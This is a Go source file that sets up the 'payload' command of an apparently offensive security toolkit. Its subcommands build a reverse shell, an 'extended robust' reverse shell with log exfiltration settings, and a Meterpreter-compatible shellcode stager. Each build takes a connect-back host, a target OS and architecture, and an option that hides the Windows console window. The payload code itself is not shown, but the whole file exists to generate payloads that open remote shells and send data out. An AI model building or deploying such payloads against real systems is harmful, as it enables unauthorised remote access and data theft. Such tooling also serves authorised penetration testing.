package cmd

import (
	"fmt"
	"runtime"
	"time"

	"github.com/spf13/cobra"
)

type BuildOpts struct {
	GoBin         string
	Arch          string
	OS            string
	Output        string
	NoWindowsGui  bool
	Deterministic bool
}

var buildOpts BuildOpts

var payloadVars struct {
	address        string
	net            string
	verbose        bool
	exfilCfg       string
	exfilTimeout   time.Duration
	preferredShell string
}

var payloadCmd = &cobra.Command{
	Use:           "payload",
	Short:         "build a payload",
	SilenceErrors: true,
}

var reverseShellCmd = &cobra.Command{
	Use:   "rsh",
	Short: "simple reverse shell",
	Run: func(cmd *cobra.Command, args []string) {
		verbose := "false"
		if payloadVars.verbose {
			verbose = "true"
		}

		err := build("rsh", injectedVariables{
			"address": payloadVars.address,
			"network": payloadVars.net,
			"verbose": verbose,
			"shell":   payloadVars.preferredShell,
		}, buildOpts)
		if err != nil {
			fmt.Println(err)
		}
	},
}

var extendedReverseShellCmd = &cobra.Command{
	Use:   "xrsh",
	Short: "extended robust reverse shell",
	Run: func(cmd *cobra.Command, args []string) {
		err := build("xrsh", injectedVariables{
			"address":      payloadVars.address,
			"network":      payloadVars.net,
			"exfilCfg":     payloadVars.exfilCfg,
			"exfilTimeout": payloadVars.exfilTimeout.String(),
			"shell":        payloadVars.preferredShell,
		}, buildOpts)
		if err != nil {
			fmt.Println(err)
		}
	},
}

var stagerCmd = &cobra.Command{
	Use:   "stager",
	Short: "meterpreter/reverse_tcp compatible shellcode stager",
	Run: func(cmd *cobra.Command, args []string) {
		err := build("stager", injectedVariables{
			"address":      payloadVars.address,
			"network":      payloadVars.net,
			"exfilCfg":     payloadVars.exfilCfg,
			"exfilTimeout": payloadVars.exfilTimeout.String(),
		}, buildOpts)
		if err != nil {
			fmt.Println(err)
		}
	},
}

func init() {
	payloadFlags := payloadCmd.PersistentFlags()
	payloadFlags.StringVarP(&buildOpts.GoBin, "go", "g", "go", "path to Go binary")
	payloadFlags.StringVarP(&payloadVars.address, "destination", "d", "",
		"connect-back destination, like LHOST (host:port)")
	payloadFlags.StringVarP(&payloadVars.net, "network", "n", "tcp", "dial network")
	payloadFlags.StringVar(&buildOpts.Arch, "arch", runtime.GOARCH, "target architecture")
	payloadFlags.StringVar(&buildOpts.OS, "os", runtime.GOOS, "target operating system")
	payloadFlags.StringVarP(&buildOpts.Output, "output", "o", "", "target operating system")
	payloadFlags.BoolVar(&buildOpts.NoWindowsGui, "nowindowsgui", false,
		"don't use -H=windowsgui")

	_ = payloadCmd.MarkPersistentFlagRequired("destination")

	rshFlags := reverseShellCmd.PersistentFlags()
	rshFlags.BoolVar(&payloadVars.verbose, "verbose", false, "print errors to stderr")
	rshFlags.StringVar(&payloadVars.preferredShell, "shell", "", "preferred shell")

	xrshFlags := extendedReverseShellCmd.PersistentFlags()
	xrshFlags.StringVarP(&payloadVars.exfilCfg, "exfil", "e", "", "log exfil configuration")
	xrshFlags.DurationVar(&payloadVars.exfilTimeout, "timeout", 3*time.Second, "exfil timeout")
	xrshFlags.StringVar(&payloadVars.preferredShell, "shell", "", "preferred shell")

	stagerFlags := stagerCmd.PersistentFlags()
	stagerFlags.StringVarP(&payloadVars.exfilCfg, "exfil", "e", "", "log exfil configuration")
	stagerFlags.DurationVar(&payloadVars.exfilTimeout, "timeout", 3*time.Second,
		"exfil timeout")

	payloadCmd.AddCommand(reverseShellCmd)
	payloadCmd.AddCommand(extendedReverseShellCmd)
	payloadCmd.AddCommand(stagerCmd)
}
